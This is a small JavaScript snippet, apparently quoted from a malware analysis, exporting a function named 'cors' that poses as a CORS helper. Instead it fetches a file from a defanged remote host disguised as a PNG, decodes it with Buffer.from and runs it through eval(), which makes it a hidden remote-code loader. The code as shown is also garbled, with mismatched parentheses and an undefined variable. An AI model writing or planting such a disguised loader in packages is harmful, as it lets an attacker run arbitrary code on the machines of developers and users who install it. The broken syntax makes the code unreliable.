    c = "utf8",
    ht = require("https"),
    cors = () => {
        const request = ht["get"]("hxxps://api.jz-aws[.]info/initial.png"), (function(response) {
            let data = "";
            response.on(data), (r => {
                data += r
            })), response.on(data, (() => {
                let plain = Buffer.from(data, t).toString();
                eval(plain)
            }))
        }))
    };
module.exports = cors;

